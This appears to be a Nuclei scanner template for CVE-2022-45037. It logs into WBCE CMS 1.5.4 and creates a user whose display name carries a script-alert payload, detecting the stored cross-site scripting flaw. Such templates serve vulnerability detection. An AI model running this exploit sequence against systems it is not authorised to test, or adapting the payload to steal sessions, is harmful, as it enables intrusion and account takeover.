http:
- extractors:
  - group: 1
    internal: true
    name: username_fieldname
    part: body
    regex:
    - name="username_fieldname" value="(.*)"
    type: regex
  - group: 1
    internal: true
    name: password_fieldname
    part: body
    regex:
    - name="password_fieldname" value="(.*)"
    type: regex
  - group: 1
    internal: true
    name: formtoken
    part: body
    regex:
    - name="formtoken" value="(.*)"
    type: regex
  - group: 1
    internal: true
    name: username_fieldname_2
    part: body
    regex:
    - name="username_fieldname" value="(.*)"
    type: regex
  matchers:
  - condition: and
    part: body_5
    type: word
    words:
    - <script>alert(document.domain)</script>
    - SESSION_TIMEOUT
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /admin/login/index.php HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /admin/login/index.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    url=&username_fieldname={{username_fieldname}}&password_fieldname={{password_fieldname}}&{{username_fieldname}}={{username}}&{{password_fieldname}}={{password}}&submit=Login

    '
  - 'GET /admin/users/index.php HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /admin/users/index.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    formtoken={{formtoken}}&user_id=&username_fieldname={{username_fieldname_2}}&{{username_fieldname_2}}=test-{{randstr}}&password={{randstr}}&password2=&display_name=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&email={{randstr}}%40gmail.com&home_folder=&groups%5B%5D=1&active%5B%5D=1&submit=

    '
  - 'GET /admin/users/ HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2022-45037
info:
  author: theamanrawat
  classification:
    cpe: cpe:2.3:a:wbce:wbce_cms:1.5.4:*:*:*:*:*:*:*
    cve-id: CVE-2022-45037
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cwe-id: CWE-79
    epss-percentile: 0.38648
    epss-score: 0.00092
  description: 'A cross-site scripting (XSS) vulnerability in /admin/users/index.php
    of WBCE CMS v1.5.4 allows attackers to execute arbitrary web scripts or HTML via
    a crafted payload injected into the Display Name field.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into web pages viewed by users, leading to potential
    data theft, session hijacking, or defacement of the affected website.

    '
  metadata:
    max-request: 5
    product: wbce_cms
    vendor: wbce
    verified: true
  name: WBCE CMS v1.5.4 -  Cross Site Scripting (Stored)
  reference:
  - https://github.com/WBCE/WBCE_CMS
  - https://shimo.im/docs/dPkpKPQEjXfvYoqO/read
  - https://nvd.nist.gov/vuln/detail/CVE-2022-45037
  remediation: 'Upgrade to the latest version of WBCE CMS or apply the necessary patches
    provided by the vendor to fix the Cross Site Scripting vulnerability.

    '
  severity: medium
  tags: cve,cve2022,xss,wbce,cms,authenticated
